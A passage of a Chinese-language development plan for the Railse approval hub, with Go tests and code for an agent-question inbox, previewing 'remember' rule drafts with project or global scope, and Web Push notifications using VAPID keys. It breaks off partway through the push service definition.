（`openTestStore` 在 Task 2 的 `push_test.go` 里定义；若 `requests_test.go` 已有自己的打开辅助，用已有的。`PayloadOther` 若不存在，用 `policy.PayloadShell` 加 `Command: "x"`。）

`internal/hub/api_test.go` 追加：
```go
func TestInboxQuestions(t *testing.T) {
	h := newTestHub(t)
	h.srv.SetPassword("hunter22")
	ck := login(t, h, "hunter22")
	id, secret := enrollMachine(t, h, "mac")
	c := dialAgent(t, h, secret, wire.Hello{MachineID: id, Proto: wire.Proto, HomeDir: "/home/u"})
	defer c.close()
	c.send(auditFrame(t,
		agent.AuditEntry{TS: time.Now(), Kind: "question", Session: proto.Session{Tool: "claude", CLISessionID: "s1", Cwd: "/p"}, State: "recorded", Message: "要不要删掉旧分支？"},
		agent.AuditEntry{TS: time.Now(), Kind: "question", Session: proto.Session{Tool: "claude", CLISessionID: "s2", Cwd: "/p"}, State: "recorded", Message: "用哪个数据库？"},
	))
	var inbox struct {
		Pending   []map[string]any `json:"pending"`
		Questions []map[string]any `json:"questions"`
	}
	waitFor(t, "两条问题进收件箱", func() bool {
		decodeBody(t, doReq(t, "GET", h.http.URL+"/api/inbox", nil, "", ck), &inbox)
		return len(inbox.Questions) == 2
	})
	if inbox.Questions[0]["kind"] != "question" || inbox.Questions[0]["title"] == "" || len(inbox.Pending) != 0 {
		t.Fatalf("inbox = %+v", inbox)
	}
	c.send(auditFrame(t, agent.AuditEntry{TS: time.Now().Add(time.Second), Kind: "done", Session: proto.Session{Tool: "claude", CLISessionID: "s1", Cwd: "/p"}, State: "recorded", Message: "DONE"}))
	waitFor(t, "s1 的问题被 done 收掉", func() bool {
		decodeBody(t, doReq(t, "GET", h.http.URL+"/api/inbox", nil, "", ck), &inbox)
		return len(inbox.Questions) == 1 && inbox.Questions[0]["cli_session_id"] == "s2"
	})
}

func TestProposeAndDecideWithScope(t *testing.T) {
	h := newTestHub(t)
	h.srv.SetPassword("hunter22")
	ck := login(t, h, "hunter22")
	id, secret := enrollMachine(t, h, "mac")
	c := dialAgent(t, h, secret, wire.Hello{MachineID: id, Proto: wire.Proto, HomeDir: "/home/u"})
	defer c.close()
	fr := pendingFrame("r1", "s1", "t1", "curl https://api.example.com/v1/x")
	fr.Risk = "network"
	c.send(fr)
	waitFor(t, "r1 登记", func() bool { _, err := h.st.GetRequest("r1"); return err == nil })
	post := func(path string, body any) *http.Response {
		b, _ := json.Marshal(body)
		return doReq(t, "POST", h.http.URL+path, b, "application/json", ck)
	}
	var draft struct {
		RuleID  string `json:"rule_id"`
		Scope   string `json:"scope"`
		YAML    string `json:"yaml"`
		Summary struct {
			Action, Payload, Anchor string
		} `json:"summary"`
	}
	resp := post("/api/requests/r1/propose", map[string]string{"action": "allow"})
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("propose: %d", resp.StatusCode)
	}
	decodeBody(t, resp, &draft)
	plain := strings.ReplaceAll(draft.YAML, `\.`, ".") // 整条命令锚定的正则里点号被转义
	if draft.Scope != "project" || !strings.Contains(plain, "api.example.com") || !strings.Contains(draft.YAML, "project:") || draft.Summary.Action != "allow" || draft.Summary.Anchor == "" || draft.RuleID == "" {
		t.Fatalf("草案: %+v", draft)
	}
	resp = post("/api/requests/r1/propose", map[string]string{"action": "allow", "scope": "global"})
	decodeBody(t, resp, &draft)
	if resp.StatusCode != http.StatusOK || draft.Scope != "global" || strings.Contains(draft.YAML, "project:") {
		t.Fatalf("全局草案: %d %+v", resp.StatusCode, draft)
	}
	// 预览不入库
	var rules []map[string]any
	decodeBody(t, doReq(t, "GET", h.http.URL+"/api/rules", nil, "", ck), &rules)
	if len(rules) != 2 {
		t.Fatalf("预览不应入库，规则数 %d", len(rules))
	}
	if resp := post("/api/requests/r1/propose", map[string]string{"action": "maybe"}); resp.StatusCode != http.StatusBadRequest {
		t.Fatalf("坏 action: %d", resp.StatusCode)
	}
	if resp := post("/api/requests/r1/propose", map[string]string{"action": "allow", "scope": "machine"}); resp.StatusCode != http.StatusBadRequest {
		t.Fatalf("坏 scope: %d", resp.StatusCode)
	}
	if resp := post("/api/requests/nope/propose", map[string]string{"action": "allow"}); resp.StatusCode != http.StatusNotFound {
		t.Fatalf("没有的请求: %d", resp.StatusCode)
	}
	// 记成全局
	resp = post("/api/requests/r1/decide", map[string]any{"action": "allow", "remember": true, "scope": "global"})
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("decide: %d", resp.StatusCode)
	}
	decodeBody(t, doReq(t, "GET", h.http.URL+"/api/rules", nil, "", ck), &rules)
	if len(rules) != 3 {
		t.Fatalf("记住后规则数 %d", len(rules))
	}
	var learned map[string]any
	for _, r := range rules {
		if r["source"] == "learned" {
			learned = r
		}
	}
	if learned == nil || strings.Contains(learned["yaml"].(string), "project:") {
		t.Fatalf("学到的规则应为全局: %+v", learned)
	}
	// 已处理的请求不能再预览
	if resp := post("/api/requests/r1/propose", map[string]string{"action": "allow"}); resp.StatusCode != http.StatusConflict {
		t.Fatalf("已处理: %d", resp.StatusCode)
	}
}

func TestProposeRefusals(t *testing.T) {
	h := newTestHub(t)
	h.srv.SetPassword("hunter22")
	ck := login(t, h, "hunter22")
	id, secret := enrollMachine(t, h, "mac")
	c := dialAgent(t, h, secret, wire.Hello{MachineID: id, Proto: wire.Proto, HomeDir: "/home/u"})
	defer c.close()
	fr := pendingFrame("r1", "s1", "t1", "git push origin main")
	fr.Risk = "outward"
	c.send(fr)
	noRoot := pendingFrame("r2", "s1", "t2", "curl https://api.example.com/v1")
	noRoot.Risk, noRoot.ProjectRoot = "network", ""
	c.send(noRoot)
	waitFor(t, "登记", func() bool { _, err := h.st.GetRequest("r2"); return err == nil })
	post := func(path string, body any) *http.Response {
		b, _ := json.Marshal(body)
		return doReq(t, "POST", h.http.URL+path, b, "application/json", ck)
	}
	var e map[string]string
	resp := post("/api/requests/r1/propose", map[string]string{"action": "allow"})
	decodeBody(t, resp, &e)
	if resp.StatusCode != http.StatusUnprocessableEntity || !strings.HasPrefix(e["error"], "不能记住：") {
		t.Fatalf("outward 不能记成放行: %d %v", resp.StatusCode, e)
	}
	resp = post("/api/requests/r2/propose", map[string]string{"action": "deny", "scope": "project"})
	decodeBody(t, resp, &e)
	if resp.StatusCode != http.StatusUnprocessableEntity || !strings.Contains(e["error"], "没有项目根") {
		t.Fatalf("没有项目根不能记成项目范围: %d %v", resp.StatusCode, e)
	}
	if resp := post("/api/requests/r2/propose", map[string]string{"action": "deny", "scope": "global"}); resp.StatusCode != http.StatusOK {
		t.Fatalf("没有项目根可以记成全局 deny: %d", resp.StatusCode)
	}
}
```
（`writeErr` 的 JSON 形状若是 `{"error":"…"}` 以外的键名，按 `server.go` 里的实际键名改 `e["error"]`。）

`TestInboxDecideRemember` 等已有用例里解码 `/api/inbox` 为数组的地方，改为解码 `{"pending": [...]}` 的 `pending` 字段。

- [ ] **Step 2: 跑测试确认失败**

Run: `go test ./internal/hub/store/ -run OpenQuestions; go test ./internal/hub/ -run 'InboxQuestions|Propose'`
Expected: FAIL，`OpenQuestions` 未定义；`/api/requests/{id}/propose` 404；inbox 形状不符。

- [ ] **Step 3: 写实现**

`internal/hub/store/requests.go` 加：
```go
// OpenQuestions 列还在等回答的 question：recorded、不早于 since，且同一会话之后没有任何新行（done、session_end、
// 新的 permission 或 question 都说明 agent 已经不在等那个问题了）。没有会话 id 的视为仍在等。
func (s *Store) OpenQuestions(since time.Time, limit int) ([]Request, error) {
	return s.queryRequests("SELECT "+requestCols+` FROM requests q
		WHERE q.kind = 'question' AND q.state = 'recorded' AND q.created_at >= ?
		  AND NOT EXISTS (SELECT 1 FROM requests r WHERE q.session_id != '' AND r.session_id = q.session_id AND r.created_at > q.created_at)
		ORDER BY q.created_at DESC LIMIT ?`, FormatTime(since), limit)
}
```

`internal/hub/requests.go`：`DecideInput` 加 `Scope string`（注释：`project` 或 `global`，空等于 project，只在 Remember 时有意义）；`commitDecision` 里调 `s.learnRule(r, in.Action, in.Scope)`。

`internal/hub/rules.go`：
- 把 `learnRule` 拆成两段。前半段：
```go
// draftRule 生成“记住”的规则草案但不入库：webhook、超长锚点、含脱敏占位符、风险等级不可学的都拒绝；
// scope 为 global 时去掉项目范围，为 project（或空）时要求请求有项目根。deny 的引擎自检在范围改写之后做，
// 草案最后经 Validate。错误一律包 errLearn（读机器失败除外）。
func (s *Server) draftRule(r store.Request, action, scope string) (policy.Rule, error) {
	if scope == "" {
		scope = "project"
	}
	if scope != "project" && scope != "global" {
		return policy.Rule{}, fmt.Errorf("%w：范围只能是 project 或 global", errLearn)
	}
	if r.Kind == "webhook" {
		return policy.Rule{}, fmt.Errorf("%w：webhook 请求不能记住", errLearn)
	}
	if what, long := anchorTooLong(r.Payload); long {
		return policy.Rule{}, fmt.Errorf("%w：%s太长不能记住（超过 4 KiB）", errLearn, what)
	}
	if hasRedacted(r.Payload) {
		return policy.Rule{}, fmt.Errorf("%w：含凭据的命令不能记住", errLearn)
	}
	if scope == "project" && r.ProjectRoot == "" {
		return policy.Rule{}, fmt.Errorf("%w：没有项目根，只能记成全局", errLearn)
	}
	m, err := s.store.GetMachine(r.MachineID)
	if err != nil {
		return policy.Rule{}, fmt.Errorf("读机器 %s: %v", r.MachineID, err)
	}
	ctx := policy.Context{ProjectRoot: r.ProjectRoot, HomeDir: m.HomeDir, MachineID: r.MachineID}
	var rule policy.Rule
	if action == "deny" {
		rule, err = denyRule(r, ctx)
	} else {
		rule, err = policy.ProposeRule(r.Payload, ctx, r.ID)
	}
	if err != nil {
		return policy.Rule{}, fmt.Errorf("%w：%w", errLearn, err)
	}
	if scope == "global" {
		rule.Scope = policy.Scope{}
	}
	if action == "deny" {
		if err := denySelfCheck(rule, r.Payload, ctx); err != nil { // 第 3 份已有的自检函数名若不同，用已有的
			return policy.Rule{}, fmt.Errorf("%w：%w", errLearn, err)
		}
	}
	if err := (policy.RuleSet{Version: 1, Rules: []policy.Rule{rule}}).Validate(); err != nil {
		return policy.Rule{}, fmt.Errorf("%w：%w", errLearn, err)
	}
	return rule, nil
}
```
后半段 `learnRule(r store.Request, action, scope string) (string, error)`：调 `draftRule`，然后保留原来的 `rulesMu` 下“读规则集 → `rulesFitFrame` → `InsertRule`”逻辑。第 3 份里 deny 自检如果是写在 `denyRule` 内部而不是单独函数，就把自检挪出来成 `denySelfCheck(rule policy.Rule, p policy.Payload, ctx policy.Context) error`（建只含这条规则的引擎，`Evaluate(p, ctx)` 必须是 deny 且 `RuleID` 等于它），在范围改写之后调用。
- 加：
```go
// ruleAnchor 是草案里用来匹配的那个锚点，网页预览用。
func ruleAnchor(r policy.Rule) string {
	m := r.Match
	switch {
	case m.CommandPrefix != "":
		return m.CommandPrefix
	case m.CommandRegex != "":
		return m.CommandRegex
	case m.PathGlob != "":
		return m.PathGlob
	case m.MCPServer != "" || m.MCPTool != "":
		return strings.TrimSuffix(m.MCPServer+"/"+m.MCPTool, "/")
	case m.Domain != "":
		return m.Domain
	}
	return ""
}
```

`internal/hub/api.go`：
- 常量加 `questionsLimit = 100`、`questionsWindow = 24 * time.Hour`、`proposeBodyMax = 1 << 10`。
- `handleInbox` 改为：
```go
// handleInbox 返回待审批（pending，至多 500 条）与最近 24 小时还在等回答的问题（至多 100 条）。
func (s *Server) handleInbox(w http.ResponseWriter, r *http.Request) {
	pending, err := s.store.ListRequests("pending", inboxLimit)
	if err != nil {
		s.internalErr(w, "列待审批", err)
		return
	}
	questions, err := s.store.OpenQuestions(time.Now().Add(-questionsWindow), questionsLimit)
	if err != nil {
		s.internalErr(w, "列待回答", err)
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"pending": s.views(pending), "questions": s.views(questions)})
}
```
- `apiRoutes` 加 `s.mux.HandleFunc("POST /api/requests/{id}/propose", write(s.handlePropose))`。
- 加：
```go
// handlePropose 只计算“记住”会生成的规则，不入库，网页在保存前展示草案并让用户选范围。
func (s *Server) handlePropose(w http.ResponseWriter, r *http.Request) {
	var body struct {
		Action string `json:"action"`
		Scope  string `json:"scope"`
	}
	if err := decodeJSON(w, r, proposeBodyMax, &body); err != nil {
		writeErr(w, http.StatusBadRequest, "请求体不是 JSON")
		return
	}
	if body.Action != "allow" && body.Action != "deny" {
		writeErr(w, http.StatusBadRequest, errBadAction.Error())
		return
	}
	if body.Scope != "" && body.Scope != "project" && body.Scope != "global" {
		writeErr(w, http.StatusBadRequest, "scope 只能是 project 或 global")
		return
	}
	req, err := s.store.GetRequest(r.PathValue("id"))
	if errors.Is(err, store.ErrNotFound) {
		writeErr(w, http.StatusNotFound, "没有这条请求")
		return
	}
	if err != nil {
		s.internalErr(w, "读请求", err)
		return
	}
	if req.State != "pending" {
		writeErr(w, http.StatusConflict, "请求已经处理过")
		return
	}
	rule, err := s.draftRule(req, body.Action, body.Scope)
	switch {
	case errors.Is(err, errLearn):
		writeErr(w, http.StatusUnprocessableEntity, err.Error())
		return
	case err != nil:
		s.internalErr(w, "生成规则草案", err)
		return
	}
	y, err := yaml.Marshal(rule)
	if err != nil {
		s.internalErr(w, "编码规则草案", err)
		return
	}
	scope := "project"
	if rule.Scope.IsGlobal() {
		scope = "global"
	}
	writeJSON(w, http.StatusOK, map[string]any{"rule_id": rule.ID, "scope": scope, "yaml": string(y),
		"summary": map[string]string{"action": string(rule.Action), "payload": string(rule.Match.Payload), "anchor": ruleAnchor(rule)}})
}
```
- `handleDecide` 的 body 加 `Scope string \`json:"scope"\``，校验同上（坏 scope 400），传入 `DecideInput{…, Scope: body.Scope}`。

`docs/hub.md`：API 表里 `/api/inbox` 的返回改为 `{"pending":[…],"questions":[…]}`（questions 是最近 24 小时还在等回答的 question 请求，同一会话之后有任何新事件即不再列出）；加一行 `POST /api/requests/{id}/propose`；decide 加 `scope`；“记住”一段加“保存前网页先调 propose 展示草案，`scope` 为 `project`（默认，要求有项目根）或 `global`”。

- [ ] **Step 4: 跑测试确认通过**

Run: `gofmt -l . && go vet ./... && go test ./internal/hub/... ./cmd/railse/ -race`
Expected: 全部 PASS（`cmd/railse` 的端到端里若解码过 `/api/inbox`，改成 `pending` 字段）。

- [ ] **Step 5: 提交**

```bash
git add internal/hub/store/requests.go internal/hub/store/requests_test.go internal/hub/rules.go internal/hub/requests.go internal/hub/api.go internal/hub/api_test.go docs/hub.md
git commit -m "feat(hub): 收件箱带还在等回答的问题；记住前可预览规则草案并选项目或全局范围"
```

---

### Task 5: hub 推送服务：VAPID 密钥、订阅接口、新请求推送、失效清理，`--public-url` 与 `railse hub vapid`

**Files:**
- Create: `internal/hub/pushsvc.go`
- Create: `internal/hub/api_push.go`
- Create: `internal/hub/pushsvc_test.go`
- Modify: `internal/hub/server.go`（`Config.PublicURL`；`New` 装推送服务；`serve` 启停工作协程）
- Modify: `internal/hub/requests.go`（两处 `request_new` 改 `announceNew`）、`internal/hub/webhook.go`（一处）
- Modify: `internal/hub/api.go`（`/api/status` 加推送字段）
- Modify: `cmd/railse/hub.go`、`cmd/railse/hub_test.go`
- Modify: `docs/hub.md`

**Interfaces:**
- `Config.PublicURL string`：hub 对外的 https 源（如 `https://hub.example.com`），`validate` 要求为空或是不带路径、查询的 `http(s)://host[:port]`；非空才启用推送（VAPID 的 `sub` 用它）
- `func LoadOrCreateVAPID(st *store.Store) (*push.VAPID, error)`：settings 键 `vapid_private`（base64url 的 32 字节），没有就生成并存
- `func RotateVAPID(st *store.Store) (*push.VAPID, int, error)`：生成新密钥、删除全部订阅（旧订阅是用旧公钥建立的，发不过去），返回删了几条
- 包内 `type pushService struct{ client *push.Client; queue chan store.Request; … }`：`New` 里建；`serve` 里 `go s.push.run(ctx)`，Run 返回前等它退出；`func (s *Server) announceNew(r store.Request)`：`clients.broadcast("request_new", view)` 之后，`kind` 为 permission、webhook、question 且推送启用时入队（队列满 256 时丢并记日志）
- 推送载荷 JSON：`{"id","kind","title","body","url":"/r/<id>"}`；`title`：permission 为 `<机器名> · <项目>`（项目空时只有机器名），question 为 `<机器名> · <项目>：等你回答`，webhook 为 `webhook`；`body`：permission 为 `<工具名>: <载荷摘要> · 风险 <risk>`，question 与 webhook 为 `title` 字段；载荷摘要：shell 取命令、file_write 取路径、network 取 URL、mcp 取 `server/tool`，截到 160 个字符。投递参数 TTL 24 小时、`Urgency: high`、`Topic` 为请求 id（32 位十六进制，合法）
- 每条请求推完记一条审计 `push_sent`（actor `system`，detail `{"sent":n,"gone":g,"failed":f}`）；端点回 `ErrGone` 立即删订阅并审计 `push_subscription_removed {"reason":"gone"}`；其他失败 `MarkPushFailure`，达到 5 次删订阅并审计 `{"reason":"failures"}`；成功 `MarkPushOK`
- 接口（都要 cookie；写接口加同源）：
  - `GET /api/push/vapid` → `{"enabled":bool,"public_key":"…","reason":"…"}`（未配置 `--public-url` 时 enabled false、reason 说明、public_key 空）
  - `POST /api/push/subscribe` body `{"endpoint":"…","keys":{"p256dh":"…","auth":"…"}}`（浏览器 `PushSubscription.toJSON()` 原样）→ 204；坏订阅 400；推送未启用 503
  - `DELETE /api/push/subscribe` body `{"endpoint":"…"}` → 204（幂等）
  - `POST /api/push/check` body `{"endpoint":"…"}` → `{"active":bool}`
  - `POST /api/push/test` body `{"endpoint":"…"}` → 同步发一条 `{"id":"test","kind":"test","title":"Railse","body":"通知正常","url":"/"}`，成功 204，端点失败 502 带文案，没有这条订阅 404
  - `GET /api/status` 加 `"push_enabled":bool,"push_subscriptions":n`
- CLI：`railse hub run` 加 `--public-url`；新子命令 `railse hub vapid [--dir] [--rotate]`：打印公钥；`--rotate` 换新密钥并删全部订阅，提示“所有手机要重新开启通知”

- [ ] **Step 1: 写失败的测试**

`internal/hub/pushsvc_test.go`:
```go
package hub

import (
	"crypto/ecdh"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/railse/railse-opc/internal/hub/push"
	"github.com/railse/railse-opc/internal/hub/wire"
)

// fakePushEndpoint 冒充推送服务：记每次收到的请求，按 status 回应。
type fakePushEndpoint struct {
	srv    *httptest.Server
	status atomic.Int32
	mu     sync.Mutex
	got    []http.Header
	bodies [][]byte
}

func newFakePushEndpoint(t *testing.T) *fakePushEndpoint {
	t.Helper()
	f := &fakePushEndpoint{}
	f.status.Store(201)
	f.srv = httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b := make([]byte, 8192)
		n, _ := r.Body.Read(b)
		f.mu.Lock()
		f.got = append(f.got, r.Header.Clone())
		f.bodies = append(f.bodies, b[:n])
		f.mu.Unlock()
		w.WriteHeader(int(f.status.Load()))
	}))
	t.Cleanup(f.srv.Close)
	return f
}

func (f *fakePushEndpoint) count() int {
	f.mu.Lock()
	defer f.mu.Unlock()
	return len(f.got)
}

// pushHub 起一个启用推送的 hub，推送客户端信任假端点的证书。
func pushHub(t *testing.T, f *fakePushEndpoint) (*testHub, *http.Cookie) {
	t.Helper()
	h := newTestHubWith(t, func(c *Config) { c.PublicURL = "https://hub.example.com" }, func(s *Server) { s.push.client.HTTP = f.srv.Client() })
	h.srv.SetPassword("hunter22")
	return h, login(t, h, "hunter22")
}

func subscribeBody(t *testing.T, endpoint string) ([]byte, *ecdh.PrivateKey) {
	t.Helper()
	ua, _ := ecdh.P256().GenerateKey(rand.Reader)
	b, _ := json.Marshal(map[string]any{"endpoint": endpoint, "keys": map[string]string{
		"p256dh": base64.RawURLEncoding.EncodeToString(ua.PublicKey().Bytes()),
		"auth":   base64.RawURLEncoding.EncodeToString([]byte("0123456789abcdef"))}})
	return b, ua
}

func TestPushVapidAndSubscribe(t *testing.T) {
	f := newFakePushEndpoint(t)
	h, ck := pushHub(t, f)
	var v struct {
		Enabled   bool   `json:"enabled"`
		PublicKey string `json:"public_key"`
	}
	decodeBody(t, doReq(t, "GET", h.http.URL+"/api/push/vapid", nil, "", ck), &v)
	if !v.Enabled || len(v.PublicKey) != 87 {
		t.Fatalf("vapid = %+v", v)
	}
	// 密钥持久化：同一个库再 New 一次公钥不变
	v2, err := LoadOrCreateVAPID(h.st)
	if err != nil || v2.PublicKeyB64() != v.PublicKey {
		t.Fatalf("公钥应持久: %v", err)
	}
	body, _ := subscribeBody(t, f.srv.URL+"/p/one")
	if resp := doReq(t, "POST", h.http.URL+"/api/push/subscribe", body, "application/json", ck); resp.StatusCode != http.StatusNoContent {
		t.Fatalf("subscribe: %d", resp.StatusCode)
	}
	// 重复订阅同一端点幂等
	if resp := doReq(t, "POST", h.http.URL+"/api/push/subscribe", body, "application/json", ck); resp.StatusCode != http.StatusNoContent {
		t.Fatalf("再次 subscribe: %d", resp.StatusCode)
	}
	if n, _ := h.st.CountPushSubscriptions(); n != 1 {
		t.Fatalf("订阅数 %d", n)
	}
	bad, _ := json.Marshal(map[string]any{"endpoint": "http://insecure/p", "keys": map[string]string{"p256dh": "AA", "auth": "AA"}})
	if resp := doReq(t, "POST", h.http.URL+"/api/push/subscribe", bad, "application/json", ck); resp.StatusCode != http.StatusBadRequest {
		t.Fatalf("坏订阅: %d", resp.StatusCode)
	}
	var st map[string]any
	decodeBody(t, doReq(t, "GET", h.http.URL+"/api/status", nil, "", ck), &st)
	if st["push_enabled"] != true || st["push_subscriptions"] != float64(1) {
		t.Fatalf("status: %v", st)
	}
	chk, _ := json.Marshal(map[string]string{"endpoint": f.srv.URL + "/p/one"})
	var active map[string]bool
	decodeBody(t, doReq(t, "POST", h.http.URL+"/api/push/check", chk, "application/json", ck), &active)
	if !active["active"] {
		t.Fatal("check 应为 active")
	}
	// 测试推送
	if resp := doReq(t, "POST", h.http.URL+"/api/push/test", chk, "application/json", ck); resp.StatusCode != http.StatusNoContent {
		t.Fatalf("test push: %d", resp.StatusCode)
	}
	if f.count() != 1 || f.got[0].Get("Content-Encoding") != "aes128gcm" || !strings.HasPrefix(f.got[0].Get("Authorization"), "vapid t=") {
		t.Fatalf("端点收到: %d %v", f.count(), f.got)
	}
	if resp := doReq(t, "DELETE", h.http.URL+"/api/push/subscribe", chk, "application/json", ck); resp.StatusCode != http.StatusNoContent {
		t.Fatalf("unsubscribe: %d", resp.StatusCode)
	}
	decodeBody(t, doReq(t, "POST", h.http.URL+"/api/push/check", chk, "application/json", ck), &active)
	if active["active"] {
		t.Fatal("删后 check 应为 false")
	}
	if resp := doReq(t, "POST", h.http.URL+"/api/push/test", chk, "application/json", ck); resp.StatusCode != http.StatusNotFound {
		t.Fatalf("删后 test push: %d", resp.StatusCode)
	}
	// 未登录
	if resp := doReq(t, "GET", h.http.URL+"/api/push/vapid", nil, "", nil); resp.StatusCode != http.StatusUnauthorized {
		t.Fatalf("未登录: %d", resp.StatusCode)
	}
}

func TestPushDisabledWithoutPublicURL(t *testing.T) {
	h := newTestHub(t)
	h.srv.SetPassword("hunter22")
	ck := login(t, h, "hunter22")
	var v map[string]any
	decodeBody(t, doReq(t, "GET", h.http.URL+"/api/push/vapid", nil, "", ck), &v)
	if v["enabled"] != false || v["public_key"] != "" || v["reason"] == "" {
		t.Fatalf("未配置 public-url: %v", v)
	}
	body, _ := subscribeBody(t, "https://web.push.apple.com/x")
	if resp := doReq(t, "POST", h.http.URL+"/api/push/subscribe", body, "application/json", ck); resp.StatusCode != http.StatusServiceUnavailable {
		t.Fatalf("未启用时订阅: %d", resp.StatusCode)
	}
}

func TestPushOnNewRequestAndCleanup(t *testing.T) {
	f := newFakePushEndpoint(t)
	h, ck := pushHub(t, f)
	body, _ := subscribeBody(t, f.srv.URL+"/p/one")
	doReq(t, "POST", h.http.URL+"/api/push/subscribe", body, "application/json", ck)
	id, secret := enrollMachine(t, h, "mac")
	c := dialAgent(t, h, secret, wire.Hello{MachineID: id, Proto: wire.Proto, HomeDir: "/home/u"})
	defer c.close()
	c.send(pendingFrame("r1", "s1", "t1", "git push origin main"))
	waitFor(t, "新请求触发推送", func() bool { return f.count() == 1 })
	if f.got[0].Get("Topic") != "r1" || f.got[0].Get("Urgency") != "high" || f.got[0].Get("TTL") != "86400" {
		t.Fatalf("投递参数: %v", f.got[0])
	}
	waitFor(t, "审计 push_sent", func() bool {
		evs, _ := h.st.ListAudit(50, "r1")
		for _, e := range evs {
			if e.Action == "push_sent" && strings.Contains(e.Detail, `"sent":1`) {
				return true
			}
		}
		return false
	})
	// 410：订阅删除
	f.status.Store(410)
	c.send(pendingFrame("r2", "s1", "t2", "git push origin main"))
	waitFor(t, "410 后删订阅", func() bool { n, _ := h.st.CountPushSubscriptions(); return n == 0 })
	// 连续失败 5 次：订阅删除
	f.status.Store(500)
	doReq(t, "POST", h.http.URL+"/api/push/subscribe", body, "application/json", ck)
	for i := 3; i <= 7; i++ {
		c.send(pendingFrame("r"+string(rune('0'+i)), "s1", "t"+string(rune('0'+i)), "git push origin main"))
	}
	waitFor(t, "5 次失败后删订阅", func() bool { n, _ := h.st.CountPushSubscriptions(); return n == 0 })
	// done 不推送
	before := f.count()
	f.status.Store(201)
	doReq(t, "POST", h.http.URL+"/api/push/subscribe", body, "application/json", ck)
	c.send(auditFrame(t, agentEntry("done", "s1", "DONE")))
	time.Sleep(300 * time.Millisecond)
	if f.count() != before {
		t.Fatal("done 不应推送")
	}
}
```
（`agentEntry(kind, session, msg)` 若 `requests_test.go` 里没有，就在本文件加一个返回 `agent.AuditEntry{TS: time.Now(), Kind: kind, Session: proto.Session{Tool: "claude", CLISessionID: session, Cwd: "/p"}, State: "recorded", Message: msg}` 的辅助，并导入 `agent`、`proto`。）

`cmd/railse/hub_test.go` 追加：
```go
func TestHubVapidPrintsAndRotates(t *testing.T) {
	dir := filepath.Join(mkTemp(t), "hub")
	var out, errOut bytes.Buffer
	if code := runHub([]string{"vapid", "--dir", dir}, nil, &out, &errOut); code != 0 {
		t.Fatalf("vapid: %d %s", code, errOut.String())
	}
	key := fieldAfter(t, out.String(), "公钥: ")
	if len(key) != 87 {
		t.Fatalf("公钥长度 %d", len(key))
	}
	out.Reset()
	runHub([]string{"vapid", "--dir", dir}, nil, &out, &errOut)
	if fieldAfter(t, out.String(), "公钥: ") != key {
		t.Fatal("不加 --rotate 公钥应不变")
	}
	out.Reset()
	if code := runHub([]string{"vapid", "--dir", dir, "--rotate"}, nil, &out, &errOut); code != 0 || fieldAfter(t, out.String(), "公钥: ") == key || !strings.Contains(out.String(), "重新开启通知") {
		t.Fatalf("rotate: %d %q", code, out.String())
	}
	if code := runHub([]string{"run", "--dir", dir, "--public-url", "hub.example.com"}, nil, &out, &errOut); code != 2 || !strings.Contains(errOut.String(), "public-url") {
		t.Fatalf("坏 --public-url 应退出 2: %d %q", code, errOut.String())
	}
}
```
（`mkTemp` 是第 3 份 `hub_test.go` 里按 `os.MkdirTemp("", "rs")` 建目录的辅助；名字不同就用已有的。）

- [ ] **Step 2: 跑测试确认失败**

Run: `go test ./internal/hub/ -run Push; go test ./cmd/railse/ -run HubVapid`
Expected: FAIL，`Config` 没有 `PublicURL`，`/api/push/*` 404，`vapid` 子命令未知。

- [ ] **Step 3: 写实现**

`internal/hub/server.go`：
- `Config` 加 `PublicURL string`（注释：hub 对外的源，推送与 VAPID 的 sub 用；空则推送停用）。`validate` 加：
```go
	if c.PublicURL != "" {
		u, err := url.Parse(c.PublicURL)
		if err != nil || (u.Scheme != "https" && u.Scheme != "http") || u.Host == "" || u.Path != "" || u.RawQuery != "" || u.Fragment != "" {
			return fmt.Errorf("public-url 必须是 https://host 形式的源，得到 %q", c.PublicURL)
		}
	}
```
- `Server` 加字段 `push *pushService`；`New` 里 `routes()` 之前：`s.push, err = newPushService(s)`（出错返回）。
- `serve` 里 `expireLoop` 旁边同样起 `s.push.run(pushCtx)`，Run 返回前 `stopPush(); <-pushDone`（与过期扫描一样的 ctx/done 写法）。
- `routes()`（或 `apiRoutes`）加 `s.pushRoutes()`。

`internal/hub/pushsvc.go`:
```go
package hub

import (
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/railse/railse-opc/internal/hub/push"
	"github.com/railse/railse-opc/internal/hub/store"
	"github.com/railse/railse-opc/internal/policy"
)

const (
	vapidSetting     = "vapid_private"
	pushQueueSize    = 256
	pushMaxFailures  = 5
	pushSummaryLen   = 160
	pushTitleLen     = 80
	pushSendTimeout  = 10 * time.Second
)

// LoadOrCreateVAPID 读 settings 里的 VAPID 私钥，没有就生成并存（明文，设计 5.3 的例外）。
func LoadOrCreateVAPID(st *store.Store) (*push.VAPID, error) {
	raw, ok, err := st.GetSetting(vapidSetting)
	if err != nil {
		return nil, fmt.Errorf("读 VAPID 密钥: %w", err)
	}
	if ok {
		b, err := base64.RawURLEncoding.DecodeString(raw)
		if err != nil {
			return nil, fmt.Errorf("VAPID 密钥损坏: %w", err)
		}
		return push.ParseVAPID(b)
	}
	v, err := push.GenerateVAPID()
	if err != nil {
		return nil, err
	}
	if err := st.SetSetting(vapidSetting, base64.RawURLEncoding.EncodeToString(v.Raw())); err != nil {
		return nil, fmt.Errorf("存 VAPID 密钥: %w", err)
	}
	return v, nil
}

// RotateVAPID 换新密钥并删掉全部订阅：旧订阅是用旧公钥建立的，新密钥签的推送会被端点拒绝。返回删了几条。
func RotateVAPID(st *store.Store) (*push.VAPID, int, error) {
	v, err := push.GenerateVAPID()
	if err != nil {
		return nil, 0, err
	}
	subs, err := st.ListPushSubscriptions()
	if err != nil {
		return nil, 0, err
	}
	for _, s := range subs {
		if _, err := st.DeletePushSubscription(s.Endpoint); err != nil {
			return nil, 0, err
		}
	}
	if err := st.SetSetting(vapidSetting, base64.RawURLEncoding.EncodeToString(v.Raw())); err != nil {
		return nil, 0, fmt.Errorf("存 VAPID 密钥: %w", err)
	}
	return v, len(subs), nil
}

// pushService 把新请求推到手机：队列 + 一个工作协程，推送失败不影响请求主流程。
type pushService struct {
